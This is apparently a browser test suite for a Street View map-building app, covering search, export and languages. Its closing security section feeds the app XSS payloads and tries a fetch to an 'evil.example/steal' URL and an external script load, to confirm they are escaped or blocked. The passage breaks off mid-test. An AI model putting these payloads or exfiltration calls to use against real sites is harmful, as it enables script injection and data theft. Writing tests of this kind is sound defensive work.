// The main walk through the app: suggestions while typing, the query, a full search with results on
// the map, popups and missed places, the export file and its tags, saved settings, languages, the
// name filter and the phone layout. Also the shared setup for answering OpenStreetMap, taginfo and Google.
const { chromium } = require("./pw.js");
const { SITE, PAGE, isSite, serveSite } = require("./site.js");
const fs = require("fs"),
  path = require("path");
const { chooseKind, clearKinds, kindLabels } = require("./helpers.js");
const leafDir = path.join(path.dirname(require.resolve("leaflet/package.json")), "dist");
const page_url = PAGE;
const A = cc => ({ type: "area", id: 3600000000 + cc.charCodeAt(0), tags: { "ISO3166-1": cc, name: cc } });
const PL = [
  { type: "node", id: 1, lat: 35.9, lon: 14.5, tags: { name: "Alpha Light" } },
  { type: "node", id: 2, lat: 35.91, lon: 14.51, tags: { name: "Beta Light" } },
  { type: "node", id: 3, lat: 35.92, lon: 14.52, tags: {} },
  { type: "way", id: 4, center: { lat: 35.93, lon: 14.53 }, tags: { name: "Delta Light" } },
  { type: "node", id: 5, lat: 35.94, lon: 14.54, tags: { name: "Epsilon" } },
  { type: "node", id: 6, lat: 35.90001, lon: 14.50001, tags: { name: "Alpha twin" } },
];
const RE = { type: "node", id: 9, lat: -21.1, lon: 55.5, tags: { name: "Reunion Light" } };
const GROUPED = [A("FR"), RE, A("MT"), ...PL.slice(0, 3), PL[5], A("RE"), RE, A("IT"), PL[3], PL[4]];
function meta(lat) {
  const k = lat.toFixed(4);
  if (k === "35.9000")
    return {
      status: "OK",
      pano_id: "PANO_ID_0000_A",
      location: { lat: 35.8998, lng: 14.5 },
      copyright: "© Google",
      date: "2021-06",
    };
  if (k === "35.9100")
    return {
      status: "OK",
      pano_id: "PANO_ID_0000_B",
      location: { lat: 35.91, lng: 14.5102 },
      copyright: "© Jane Doe",
      date: "2019-01",
    };
  if (k === "35.9200") return { status: "ZERO_RESULTS" };
  if (k === "35.9300")
    return {
      status: "OK",
      pano_id: "PANO_ID_0000_D",
      location: { lat: 35.93, lng: 14.5298 },
      copyright: "© Google",
      date: "2023-09",
    };
  if (k === "35.9400")
    return {
      status: "OK",
      pano_id: "PANO_ID_0000_E",
      location: { lat: 35.942, lng: 14.54 },
      copyright: "© Google",
      date: "2020-01",
    };
  if (k === "-21.1000")
    return {
      status: "OK",
      pano_id: "PANO_ID_0000_R",
      location: { lat: -21.1001, lng: 55.5 },
      copyright: "© Google",
      date: "2022-02",
    };
  return { status: "UNKNOWN_ERROR" };
}
/* Ticks every Street View country under "Only the countries I choose", so a search runs in parts. */
async function allCoverage(page) {
  await page.check("input[name=scope][value=pick]");
  await page.evaluate(() => {
    selected.clear();
    for (const c of COVERAGE) selected.add(c);
    renderCountries();
  });
}
async function setup(browser, o = {}) {
  const opt = Object.assign(
    {
      vp: { width: 1360, height: 860 },
      failGrouped: false,
      osmDelay: 0,
      gDelay: 0,
      taginfo: true,
      locale: "en-US",
      count: 23456,
    },
    o,
  );
  const ctx = await browser.newContext({ viewport: opt.vp, acceptDownloads: true, locale: opt.locale });
  const page = await ctx.newPage();
  const log = { overpass: [], errors: [], taginfo: [], opt, svLookups: 0, svLocations: [] };
  page.on("pageerror", e => log.errors.push(String(e)));
  page.on("console", m => {
    if (m.type() === "error" && !/Failed to load resource|ERR_FAILED/.test(m.text()))
      log.errors.push(m.text());
  });
  const H = { "access-control-allow-origin": "*" };
  await page.route("**/*", async route => {
    const u = route.request().url();
    if (isSite(u)) return serveSite(route);
    if (u.includes("leaflet.min.js"))
      return route.fulfill({
        body: fs.readFileSync(leafDir + "/leaflet.js"),
        contentType: "text/javascript",
      });
    if (u.includes("leaflet.min.css"))
      return route.fulfill({ body: fs.readFileSync(leafDir + "/leaflet.css"), contentType: "text/css" });
    if (u.includes("/api/interpreter")) {
      const q = decodeURIComponent(route.request().postData().slice(5));
      log.overpass.push(q);
      if (opt.osmDelay) await new Promise(r => setTimeout(r, opt.osmDelay));
      if (q.includes("foreach"))
        return opt.failGrouped
          ? route.fulfill({ status: 400, body: "parse error", headers: H })
          : route.fulfill({ json: { elements: GROUPED }, headers: H });
      return route.fulfill({ json: { elements: [...PL, RE, ...(opt.extra || [])] }, headers: H });
    }
    if (u.includes("taginfo.openstreetmap.org/api")) {
      log.taginfo.push(u);
      if (!opt.taginfo) return route.abort();
      if (u.includes("search/by_value"))
        return route.fulfill({
          json: {
            data: [
              { key: "man_made", value: "lighthouse", count_all: 23456 },
              { key: "seamark:type", value: "light_minor", count_all: 90000 },
              { key: "name", value: "lighthouse", count_all: 5000 },
              { key: "building", value: "lighthouse", count_all: 1200 },
              { key: "historic", value: "lighthouse_x", count_all: 20 },
            ],
          },
          headers: H,
        });
      if (u.includes("keys/all"))
        return route.fulfill({
          json: {
            data: [
              { key: "alpaca", count_all: 7 },
              { key: "name:alpaca", count_all: 50 },
            ],
          },
          headers: H,
        });
      if (u.includes("/stats"))
        return route.fulfill({
          json: {
            data: [
              { type: "all", count: log.opt.count },
              { type: "nodes", count: 1 },
            ],
          },
          headers: H,
        });
    }
    if (u.includes("streetview/metadata")) {
      if (opt.gDelay) await new Promise(r => setTimeout(r, opt.gDelay));
      const m = /location=([-\d.]+),([-\d.]+)/.exec(u);
      log.svLookups++;
      log.svLocations.push(m[1] + "," + m[2]);
      return route.fulfill({ json: meta(+m[1], +m[2]), headers: H });
    }
    if (u.includes("maps/api/js")) return route.abort();
    return route.fulfill({ status: 204, body: "" });
  });
  await page.goto(page_url);
  await page.waitForLoadState("load");
  await allCoverage(page); // these tests search all Street View countries
  return { page, log, ctx };
}
const done = page =>
  page.waitForFunction(() => !running && !/Ready/.test(document.getElementById("now").textContent), null, {
    timeout: 60000,
  });
(async () => {
  const browser = await chromium.launch();
  let fail = 0;
  const ok = (c, m) => {
    console.log((c ? "PASS " : "FAIL ") + m);
    if (!c) fail++;
  };

  {
    const { page, log } = await setup(browser, { osmDelay: 400, gDelay: 1500 });
    ok((await page.inputValue("#maxDist")) === "50", "default 50 m");
    ok(
      (await page.evaluate(() => {
        const t = document.getElementById("target");
        return t.defaultValue;
      })) === "1000",
      "default 1000 locations wanted",
    );
    ok(
      JSON.stringify(await page.$$eval("input[name=scope]", rs => rs.map(r => r.value))) ===
        '["pick","world"]',
      "two search areas: chosen countries and the whole world",
    );
    ok(
      !/Maps JavaScript API/.test(await page.textContent("label:has(#tagRoad)")),
      "road tag hint has no API note",
    );
    {
      const gap = await page.evaluate(
        () =>
          document.querySelector("input[name=scope][value=world]").closest("label").getBoundingClientRect()
            .top - document.getElementById("pickBox").getBoundingClientRect().bottom,
      );
      ok(gap >= 14, "space between country list and Whole world: " + gap);
    }
    ok(
      /gets its country/.test(await page.textContent("label:has(input[value=world])")),
      "whole-world hint says locations still get their country",
    );
    await page.fill("#maxDist", "25"); // the checks below were written for 25 m
    await page.fill("#apiKey", "KEY");
    // autocomplete
    await page.click("#kind");
    await page.keyboard.type("lightho", { delay: 20 });
    await page.waitForSelector("#suggest li.grp");
    await page.waitForTimeout(600);
    const sug = await page.$$eval("#suggest li", ls => ls.map(l => l.textContent.replace(/\s+/g, " ")));
    console.log(sug);
    ok(/^Lighthouse\s*man_made=lighthouse/.test(sug[0]), "catalogue suggestion first");
    ok(
      sug.some(s => /building=lighthouse.*1,200/.test(s)) &&
        !sug.some(s => /name=lighthouse/.test(s)) &&
        sug.some(s => /lighthouse_x.*20/.test(s)) &&
        sug.some(s => /alpaca=\*.*7/.test(s)) &&
        !sug.some(s => /name:alpaca/.test(s)) &&
        sug.filter(s => /man_made=lighthouse/.test(s)).length === 1,
      "taginfo group filtered + deduped",
    );
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/b1.png") });
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => /23,456/.test(document.getElementById("picked").textContent));
    ok(
      /Searching for man_made=lighthouse/.test(await page.textContent("#picked")),
      "picked card: " + (await page.textContent("#picked")),
    );
    ok(
      (await page.getAttribute("#mapName", "placeholder")) === "Lighthouse (120 countries)",
      "name placeholder: " + (await page.getAttribute("#mapName", "placeholder")),
    );
    // run with coverage default
    await page.click("#go");
    await page.waitForSelector("#live:not([hidden])");
    await page.waitForTimeout(700);
    ok(
      await page.evaluate(
        () =>
          document.getElementById("fields").disabled &&
          /busy|osm/.test(document.getElementById("track").className) &&
          document.getElementById("empty").hidden,
      ),
      "phase 1: form locked, bar active, empty hidden",
    );
    console.log("live1:", await page.textContent("#liveTitle"), "|", await page.textContent("#liveSub"));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/b2.png") });
    await page.waitForSelector("#live.corner");
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/b3.png") });
    await done(page);
    ok(
      (await page.isHidden("#live")) &&
        !(await page.evaluate(() => document.getElementById("fields").disabled)),
      "overlay gone, form unlocked",
    );
    const partCodes = log.overpass.map(q => /\^\(([A-Z|]+)\)\$/.exec(q)[1].split("|"));
    const shape =
      /^\[out:json\]\[timeout:90\];area\["ISO3166-1"~"\^\([A-Z|]+\)\$"\]->\.all;foreach\.all->\.c\(\.c out tags;node\["man_made"="lighthouse"\]\(area\.c\);out body;\(way.*\(area\.c\);relation.*\(area\.c\);\);out tags center;\);$/;
    console.log("parts:", partCodes.map(c => c.length).join("+"));
    ok(
      log.overpass.length >= 10 &&
        log.overpass.every(q => shape.test(q)) &&
        partCodes.flat().length === 120 &&
        new Set(partCodes.flat()).size === 120,
      "search sent in parts covering all 120 countries exactly once",
    );
    ok(
      partCodes.filter(c => ["US", "RU", "CA", "BR", "AU"].some(x => c.includes(x))).length === 5,
      "each very large country in its own part",
    );
    const j = JSON.parse(await page.evaluate(() => exportJson()));
    console.log(JSON.stringify(j));
    const by = Object.fromEntries(j.customCoordinates.map(c => [c.panoId, c]));
    ok(
      j.customCoordinates.length === 3 &&
        by.PANO_ID_0000_A.countryCode === "MT" &&
        by.PANO_ID_0000_D.countryCode === "IT",
      "country codes from groups",
    );
    ok(
      by.PANO_ID_0000_R.countryCode === "RE",
      "territory preferred over parent: " + by.PANO_ID_0000_R.countryCode,
    );
    ok(
      Math.abs(by.PANO_ID_0000_D.heading - 90) < 0.5 &&
        by.PANO_ID_0000_A.extra.tags.join() === "Malta" &&
        by.PANO_ID_0000_R.extra.tags.join() === "Réunion,France",
      "heading + default tags: country only; a territory gets its own name and its country",
    );
    // the country tag uses the owner's list (COUNTRY_TAGS); territories not on it are named in English
    const tagsOf = await page.evaluate(() =>
      ["US", "AE", "TR", "CD", "GM", "DE", "PR", "RE"].map(countryTag).join(" | "),
    );
    ok(
      tagsOf ===
        "USA | UAE | Turkey | Democratic Republic of the Congo | The Gambia | Germany | Puerto Rico | Réunion",
      "country tags come from the list, territories not on it are named in English: " + tagsOf,
    );
    // territories: their own name and their country by default, or one of the two (TERRITORY_OF)
    const terr = await page.evaluate(() =>
      [
        countryTags("PR"),
        countryTags("PR", "own"),
        countryTags("PR", "parent"),
        countryTags("MO", "parent"),
        countryTags("EH"),
        countryTags("DE", "parent"),
        countryTags("HK"),
      ]
        .map(t => t.join("+"))
        .join(" | "),
    );
    ok(
      terr === "Puerto Rico+USA | Puerto Rico | USA | China | Western Sahara | Germany | Hong Kong",
      "territories: both names, own only, country only; countries and Hong Kong unchanged: " + terr,
    );
    ok(
      (await page.isChecked("#tagCountry")) && !(await page.$("#tags")) && !(await page.$("#tagName")),
      "country tag on by default; kind and name tag options are gone",
    );
    console.log(await page.textContent("#tally"), "|", await page.textContent("#now"));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/b4.png") });
    ok(log.errors.length === 0, "no page errors " + log.errors.join(" | "));
    // left-out places have popups with Google Maps links
    const miss = await page.evaluate(() => {
      const out = {};
      dots.eachLayer(l => {
        const h = l.getPopup().getContent()(l);
        const n = /<b>(.*?)<\/b>/.exec(h)[1];
        out[n] = h;
      });
      return out;
    });
    console.log(Object.keys(miss).join(" | "));
    ok(Object.keys(miss).length === 4 && !("Delta Light" in miss), "dots remain only for left-out places");
    ok(
      /No Street View within 25 m\./.test(miss["Unnamed place"]) &&
        /google\.com\/maps\/search\/\?api=1&query=35\.92%2C14\.52/.test(miss["Unnamed place"]) &&
        !/nearest Street View<\/a>/.test(miss["Unnamed place"]),
      "no-coverage popup + maps link",
    );
    ok(
      /222 m away, beyond your 25 m/.test(miss["Epsilon"]) && /pano=PANO_ID_0000_E/.test(miss["Epsilon"]),
      "too-far popup offers nearest pano",
    );
    ok(
      /only photos uploaded by other people/.test(miss["Beta Light"]) &&
        /Shares its Street View spot/.test(Object.values(miss).join()),
      "unofficial + duplicate reasons",
    );
    await page.evaluate(() => {
      let d;
      dots.eachLayer(l => {
        if (/Epsilon/.test(l.getPopup().getContent()(l))) d = l;
      });
      map.setView(d.getLatLng(), 15, { animate: false });
      d.openPopup();
    });
    await page.waitForSelector(".pop");
    await page.waitForTimeout(400);
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/d1.png") });
    // remove a location from the map, then undo
    await page.evaluate(() => {
      const m = results.find(r => r.panoId === "PANO_ID_0000_D").layers[2];
      map.setView(m.getLatLng(), 16, { animate: false });
      m.openPopup();
    });
    await page.waitForSelector(".pop .rm");
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/c2.png") });
    await page.click(".pop .rm");
    ok(
      (await page.evaluate(() =>
        results
          .map(r => r.panoId)
          .sort()
          .join(),
      )) === "PANO_ID_0000_A,PANO_ID_0000_R" &&
        (await page.textContent("#count")) === "2" &&
        /1 removed by you/.test(await page.textContent("#tally")),
      "removed: " + (await page.textContent("#tally")),
    );
    ok(
      !/PANO_ID_0000_D/.test(await page.evaluate(() => exportJson())) &&
        (await page.evaluate(() => layer.getLayers().length)) === 6,
      "gone from export and map",
    );
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/c3.png") });
    await page.click("#undo");
    ok(
      (await page.evaluate(() => results.length)) === 3 &&
        !/removed by you/.test(await page.textContent("#tally")) &&
        (await page.evaluate(() => layer.getLayers().length)) === 9,
      "undo restores",
    );
    // expert query panel
    ok(
      !(await page.evaluate(() => document.getElementById("expert").open)),
      "expert panel closed by default",
    );
    ok(
      (await page.textContent("#expert summary")).trim() === "Expert",
      'expert panel heading is just "Expert"',
    );
    await page.click("#expert summary");
    ok(
      JSON.stringify(
        await page.$$eval("#expert details.part > summary", x => x.map(e => e.textContent.trim())),
      ) === '["The query for Overpass Turbo","Run your own query","Load a result from Overpass Turbo"]' &&
        (await page.$$eval("#expert details.part", x => x.every(d => !d.open))),
      "expert panel: three sections, all closed at first",
    );
    await page.click("#partQuery summary");
    await page.click("#partTurbo summary");
    await page
      .waitForFunction(() => !document.getElementById("partQuery").open, null, { timeout: 2000 })
      .catch(() => {});
    ok(
      (await page.evaluate(() => document.getElementById("partTurbo").open)) &&
        !(await page.evaluate(() => document.getElementById("partQuery").open)),
      "only one section open at a time",
    );
    ok(
      (await page.$$eval("#expert details.fmt", x => x.length)) === 2 &&
        (await page.$eval("#partQuery .fmt", e => e.textContent)) ===
          (await page.$eval("#partLoad .fmt", e => e.textContent)) &&
        !(await page.$("#partTurbo .fmt")),
      "format requirements shown in the query and load sections, from the same text",
    );
    const qt = await page.inputValue("#queryText");
    console.log(qt.replace(/\(AD\|.*ZA\)/, "(AD|…|ZA)"));
    ok(
      /timeout:180/.test(qt) &&
        /foreach\.all->\.c\(/.test(qt) &&
        /\^\(([A-Z|]+)\)\$/.exec(qt)[1].split("|").length === 120,
      "expert query is the combined 120-country query",
    );
    const href = await page.getAttribute("#turbo", "href");
    ok(
      href.startsWith("https://overpass-turbo.eu/?Q=") && decodeURIComponent(href.split("?Q=")[1]) === qt,
      "turbo link carries the query",
    );
    await page.context().grantPermissions(["clipboard-read", "clipboard-write"]);
    await page.click("#copyQuery");
    ok((await page.evaluate(() => navigator.clipboard.readText())) === qt, "copy query");
    await page.evaluate(() => document.querySelector(".panel").scrollTo(0, 99999));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/e1.png") });
    // country tag off: no tags at all
    await page.uncheck("#tagCountry");
    await page.click("#go");
    await done(page);
    ok(
      JSON.parse(await page.evaluate(() => exportJson())).customCoordinates.every(c => !("extra" in c)),
      "country tag off: no tags, no extra field",
    );
    await page.check("#tagCountry");
    // pick scope with uncovered country
    await page.check("input[name=scope][value=pick]");
    await page.evaluate(() => {
      selected.clear();
      renderCountries();
    });
    await page.fill("#countrySearch", "ma");
    await page.check("#countries input[value=MT]");
    await page.check("#countries input[value=MG]");
    ok(
      /Madagascar has no official/.test(await page.textContent("#scopeNote")),
      "note: " + (await page.textContent("#scopeNote")),
    );
    await page.evaluate(() => document.querySelector(".panel").scrollTo(0, 300));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/b5.png") });
    await page.click("#allowUnofficial");
    ok(
      !(await page.isChecked("#official")) && (await page.isHidden("#scopeNote")),
      "button unticks official",
    );
    await page.click("#go");
    await done(page);
    ok(/\^\(MT\|MG\)\$/.test(log.overpass.at(-1)), "pick query codes");
    ok((await page.evaluate(() => results.length)) === 4, "unofficial now kept -> 4");
    // world
    await page.check("input[name=scope][value=world]");
    await page.click("#go");
    await done(page);
    ok(
      log.overpass.at(-1) ===
        '[out:json][timeout:180];node["man_made"="lighthouse"];out body;(way["man_made"="lighthouse"];relation["man_made"="lighthouse"];);out tags center;',
      "world query",
    );
    {
      const w = JSON.parse(await page.evaluate(() => exportJson()));
      const cc = Object.fromEntries(w.customCoordinates.map(c => [c.panoId, c.countryCode]));
      ok(
        /\(World\)$/.test(w.name) &&
          w.customCoordinates.every(
            c =>
              c.countryCode && c.extra.tags.join() === (c.countryCode === "RE" ? "Réunion,France" : "Malta"),
          ) &&
          cc.PANO_ID_0000_A === "MT" &&
          cc.PANO_ID_0000_R === "RE",
        "world: every location gets its country from its position (Réunion as RE): " + JSON.stringify(cc),
      );
    }
    ok(
      !(await page.isDisabled("#tagCountry")) && (await page.isHidden("#tagCountryHint")),
      "country tag available for whole world",
    );
    await page.evaluate(() => document.getElementById("tagCountry").scrollIntoView({ block: "center" }));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/j1.png") });
    // world with official coverage only: a place in a country Google has not driven is skipped
    log.opt.extra = [{ type: "node", id: 50, lat: -18.91, lon: 47.52, tags: { name: "Antananarivo Light" } }];
    await page.check("#official");
    const lookupsBefore = log.svLookups;
    await page.click("#go");
    await done(page);
    ok(
      /1<\/b> skipped in countries without official Street View/.test(await page.innerHTML("#tally")) &&
        !log.svLocations.some(l => l.startsWith("-18.91")) &&
        log.svLookups > lookupsBefore,
      "world + official only: place in Madagascar skipped before any Google lookup",
    );
    log.opt.extra = [];
    // raw tag: typed, offered as "Use the tag you typed", and added by "Find locations" without Enter
    await clearKinds(page);
    await page.fill("#kind", "amenity=pub|bar, name=*");
    await page.waitForFunction(() =>
      /Use the tag you typed/.test(document.getElementById("suggest").textContent),
    );
    await page.click("#go");
    await done(page);
    ok(
      log.overpass.at(-1).includes('node["amenity"~"^(pub|bar)$"]["name"];out body;') &&
        (await kindLabels(page)) === "amenity=pub|bar, name=*",
      "raw tag filter; the typed tag became a chip when the search started",
    );
    // name search
    await allCoverage(page);
    await chooseKind(page, "Lighthouse");
    await page.fill("#nameHas", 'Liberty, liberté, St. "X"');
    ok(
      /name containing Liberty or liberté/.test(await page.textContent("#picked")) &&
        (await page.getAttribute("#mapName", "placeholder")) === "Lighthouse: Liberty (120 countries)",
      "name card: " + (await page.textContent("#picked")),
    );
    await page.evaluate(() => document.querySelector(".panel").scrollTo(0, 150));
    await page.screenshot({ path: require("path").join(__dirname, "../dist/screens/c1.png") });
    await page.click("#go");
    await done(page);
    ok(
      log.overpass
        .at(-1)
        .includes('node["man_made"="lighthouse"]["name"~"Liberty|liberté|St\\\\. \\"X\\"",i](area.c);'),
      "kind + name filter: " + /node[^;]*/.exec(log.overpass.at(-1))[0],
    );
    const lj = JSON.parse(await page.evaluate(() => exportJson()));
    ok(
      /^Lighthouse: Liberty/.test(lj.name) && !JSON.stringify(lj.customCoordinates).includes("Liberty"),
      "search label names the map, but is not added as a tag: " + lj.name,
    );
    await clearKinds(page);
    await page.fill("#nameHas", "alpaka, alpaca");
    let n0 = log.overpass.length;
    await page.check("input[name=scope][value=world]");
    await page.click("#go");
    ok(
      /without a kind of place/.test(await page.textContent("#message")) &&
        /too much for the whole world/.test(await page.textContent("#message")) &&
        log.overpass.length === n0,
      "name-only blocked for the whole world",
    );
    await page.check("input[name=scope][value=pick]");
    await page.evaluate(() => {
      selected.clear();
      selected.add("MT");
      selected.add("MG");
      renderCountries();
    });
    await page.click("#go");
    await done(page);
    ok(
      (await page.inputValue("#queryText")).includes('  node["name"~"alpaka|alpaca",i](area.c);') &&
        /\^\(MT\|MG\)\$/.test(await page.inputValue("#queryText")),
      "expert query follows settings",
    );
    ok(
      log.overpass.at(-1).includes('node["name"~"alpaka|alpaca",i](area.c);') &&
        /\^\(MT\|MG\)\$/.test(log.overpass.at(-1)),
      "name-only on chosen countries",
    );
    ok(
      (await page.evaluate(() => lastName)) === "Alpaka (Malta and Madagascar)",
      "name-only map name: " + (await page.evaluate(() => lastName)),
    );
    await page.fill("#nameHas", "ab");
    await page.click("#go");
    ok(/too short/.test(await page.textContent("#message")), "short word");
    await page.fill("#nameHas", "");
    await page.click("#go");
    ok(/Choose a kind of place or enter a name/.test(await page.textContent("#message")), "nothing entered");
    ok(
      /Choose a kind of place/.test(await page.inputValue("#queryText")) &&
        (await page.isDisabled("#copyQuery")) &&
        (await page.getAttribute("#turbo", "href")) === "https://overpass-turbo.eu/",
      "expert panel with nothing chosen",
    );
    await page.check("input[name=scope][value=world]");
    // junk text
    await clearKinds(page);
    await page.fill("#kind", "zzzzqq");
    await page.waitForTimeout(500);
    await page.click("#go");
    ok(
      /Pick one of the suggestions/.test(await page.textContent("#message")),
      "unpicked text: " + (await page.textContent("#message")),
    );
    // exact name without picking
    await clearKinds(page);
    await page.fill("#kind", "windmill");
    await page.keyboard.press("Escape");
    await page.click("#go");
    await done(page);
    ok(log.overpass.at(-1).includes('"man_made"="windmill"'), "exact name accepted");
    // too many
    log.opt.count = 900000;
    await page.check("input[name=scope][value=world]");
    await chooseKind(page, "Castle");
    await page.waitForFunction(() => /900,000/.test(document.getElementById("picked").textContent));
    const n = log.overpass.length;
    await page.click("#go");
    ok(
      /too many to search at once/.test(await page.textContent("#message")) && log.overpass.length === n,
      "too many blocked: " + (await page.textContent("#picked")),
    );
    await page.fill("#nameHas", "neuschwan");
    await page.click("#go");
    await done(page);
    ok(
      log.overpass.length > n && !/That is a lot/.test(await page.textContent("#picked")),
      "name filter lifts the too-many block",
    );
    await page.fill("#nameHas", "");
    await page.reload();
    await page.waitForLoadState("load");
    await page.waitForFunction(() => kinds.length > 0, null, { timeout: 5000 }).catch(() => {});
    ok(
      (await kindLabels(page)) === "Castle" && (await page.isChecked("input[name=scope][value=world]")),
      "restored: " + (await kindLabels(page)),
    );
    ok(log.errors.length === 0, "no page errors " + log.errors.join(" | "));
  }
  // German locale, grouped query rejected, taginfo down
  {
    const { page, log } = await setup(browser, { locale: "de-DE", failGrouped: true, taginfo: false });
    await page.fill("#apiKey", "KEY");
    ok((await page.inputValue("#lang")) === "de", "language from browser");
    ok((await page.$$("#ideas")).length === 0, "no suggestion chips");
    await page.click("#kind");
    await page.keyboard.type("kirche", { delay: 20 });
    await page.waitForTimeout(700);
    const sug = await page.$$eval("#suggest li", ls => ls.map(l => l.textContent.replace(/\s+/g, " ")));
    console.log(sug.slice(0, 5));
    ok(
      sug.some(s => /Kirche/.test(s)),
      "German suggestions",
    );
    await clearKinds(page);
    await page.click("#kind");
    await page.keyboard.type("Leuchtt", { delay: 20 });
    await page.keyboard.press("Enter");
    ok((await kindLabels(page)) === "Leuchtturm", "picked Leuchtturm");
    await page.waitForFunction(() => /taginfo/.test(document.getElementById("picked").textContent));
    await page.selectOption("#lang", "fr");
    ok((await kindLabels(page)) === "Phare", "switch to French renames: " + (await kindLabels(page)));
    await clearKinds(page);
    await page.click("#kind");
    await page.keyboard.type("eglise", { delay: 20 });
    await page.waitForTimeout(100);
    ok(
      (await page.$$eval("#suggest li", ls => ls.map(l => l.textContent))).some(s => /Église/.test(s)),
      "accent-insensitive French",
    );
    await clearKinds(page);
    await page.click("#kind");
    await page.keyboard.type("lighthouse", { delay: 20 });
    await page.keyboard.press("Enter");
    ok((await kindLabels(page)) === "Phare", "English word works in French mode");
    await page.click("#go");
    await done(page);
    ok(
      log.overpass.some(q => q.includes("(area.all)")) &&
        log.overpass.filter(q => q.includes("foreach")).length <= 2,
      "ungrouped fallback after the server rejects grouping: " + log.overpass.length + " requests",
    );
    const j = JSON.parse(await page.evaluate(() => exportJson()));
    console.log("FALLBACK", JSON.stringify(j).slice(0, 400));
    ok(
      j.customCoordinates.length === 3 &&
        j.name === "Phare (120 countries)" &&
        j.customCoordinates.every(c => !(c.extra?.tags || []).includes("Phare")),
      "fallback results " + j.name,
    );
    ok(log.errors.length === 0, "no page errors " + log.errors.join(" | "));
  }
  // ---- security: hostile answers from every outside service, and the content security policy
  {
    const X = '"><img src=x onerror="window.__xss=(window.__xss||0)+1">',
      XS = `'><svg onload='window.__xss=1'>`;
    const { page, log } = await setup(browser);
    const blocked = [];
    page.on("console", m => {
      if (/Content Security Policy/.test(m.text())) blocked.push(m.text());
    });
    const H = { "access-control-allow-origin": "*" };
    await page.route("**/api/interpreter", r =>
      r.fulfill({
        headers: H,
        json: {
          elements: [
            { type: "area", id: 1, tags: { "ISO3166-1": X } },
            { type: X, id: 1, lat: 35.9, lon: 14.5, tags: { name: "bad type" } },
            { type: "node", id: X, lat: 35.9, lon: 14.5, tags: { name: "bad id" } },
            { type: "node", id: 11, lat: "35.9" + X, lon: 14.5, tags: { name: "bad lat" } },
            { type: "node", id: 12, lat: 35.9, lon: 14.5, tags: { name: X + XS } },
            { type: "node", id: 13, lat: 35.92, lon: 14.52, tags: { name: { toString: 1 } } },
            { type: "way", id: 14, center: { lat: 35.93, lon: 14.53 }, tags: { name: XS } },
            null,
            7,
            "x",
          ],
        },
      }),
    );
    await page.route("**/streetview/metadata**", r => {
      const m = /location=([-\d.]+),/.exec(r.request().url());
      const k = (+m[1]).toFixed(4);
      const j =
        k === "35.9000"
          ? {
              status: "OK",
              pano_id: "GOODPANOID_0001",
              location: { lat: 35.8999, lng: 14.5 },
              copyright: "© Google",
              date: X,
            }
          : k === "35.9200"
            ? {
                status: "OK",
                pano_id: X,
                location: { lat: 35.92, lng: 14.52 },
                copyright: "© Google",
                date: "2020-01",
              }
            : {
                status: "OK",
                pano_id: "GOODPANOID_0002",
                location: { lat: X, lng: 14.53 },
                copyright: X,
                date: "2020-01",
              };
      r.fulfill({ headers: H, json: j });
    });
    await page.route("**/taginfo.openstreetmap.org/api/**", r => {
      const u = r.request().url();
      if (u.includes("by_value"))
        return r.fulfill({
          headers: H,
          json: {
            data: [
              { key: X, value: "lighthouse", count_all: 500 },
              { key: "man_made", value: "lighthouse", count_all: X },
              { key: "building", value: "lighthouse", count_all: "77" },
              { key: "ok", value: X, count_all: 5 },
              null,
              3,
            ],
          },
        });
      if (u.includes("keys/all")) return r.fulfill({ headers: H, json: { data: { not: "an array" } } });
      return r.fulfill({ headers: H, json: { data: [{ type: "all", count: X }] } });
    });
    await page.fill("#apiKey", "KEY");
    await page.click("#kind");
    await page.keyboard.type("lighthouse", { delay: 15 });
    await page.waitForTimeout(700);
    const sug = await page.$$eval("#suggest li", ls => ls.map(l => l.textContent.replace(/\s+/g, " ")));
    console.log(sug);
    ok(
      sug.some(s => /building=lighthouse.*77/.test(s)) && !sug.some(s => /img|onerror/.test(s)),
      "hostile taginfo rows dropped, numeric string count kept",
    );
    await page.keyboard.press("Enter");
    await page.waitForTimeout(300);
    ok(/See this tag on taginfo/.test(await page.textContent("#picked")), "hostile count ignored");
    await page.fill("#nameHas", X);
    ok((await page.$$eval("#picked img, #picked svg", e => e.length)) === 0, "name words rendered as text");
    await page.fill("#nameHas", "");
    await page.click("#go");
    await done(page);
    const st = await page.evaluate(() => ({
      places: searchStats.places,
      n: results.length,
      failed: searchStats.failed,
      cc: results.map(r => r.poi.cc),
      date: results.map(r => r.date),
    }));
    console.log(JSON.stringify(st));
    ok(st.places === 3 && st.n === 1 && st.failed === 2, "malformed places and panoramas rejected");
    ok(
      st.cc[0] === "MT" && st.date[0] === "",
      "hostile country code and date discarded; the country is found from the position instead: " + st.cc[0],
    );
    // open every popup, found and left out
    await page.evaluate(() => {
      layer.eachLayer(l => {
        if (l.getPopup) {
          l.openPopup();
        }
      });
    });
    await page.waitForSelector(".pop");
    const pop1 = await page.innerHTML(".leaflet-popup-content");
    await page.evaluate(() => {
      dots.eachLayer(l => l.openPopup());
    });
    await page.waitForTimeout(300);
    const pop2 = await page.innerHTML(".leaflet-popup-content");
    ok(
      /&lt;img/.test(pop1) && !/<img|<svg/.test(pop1) && !/<img|<svg/.test(pop2),
      "place names escaped in popups",
    );
    ok(
      (await page.evaluate(() => window.__xss)) === undefined &&
        (await page.$$eval('img[src="x"], svg[onload]', e => e.length)) === 0,
      "no injected markup executed",
    );
    // content security policy
    const csp = await page.evaluate(async () => {
      const out = {};
      const s = document.createElement("script");
      s.textContent = "window.__inline=1";
      document.head.append(s);
      out.inline = window.__inline;
      const d = document.createElement("div");
      d.innerHTML = '<img src="data:image/gif;base64,AAAA" onerror="window.__handler=1">';
      document.body.append(d);
      await new Promise(r => setTimeout(r, 300));
      out.handler = window.__handler;
      try {
        await fetch("https://evil.example/steal?k=1");
        out.fetch = "allowed";
      } catch {
        out.fetch = "blocked";
      }
      out.ext = await new Promise(r => {
        const e = document.createElement("script");
        e.src = "https://evil.example/x.js";
        e.onload = () => r("loaded");
        e.onerror = () => r("blocked");
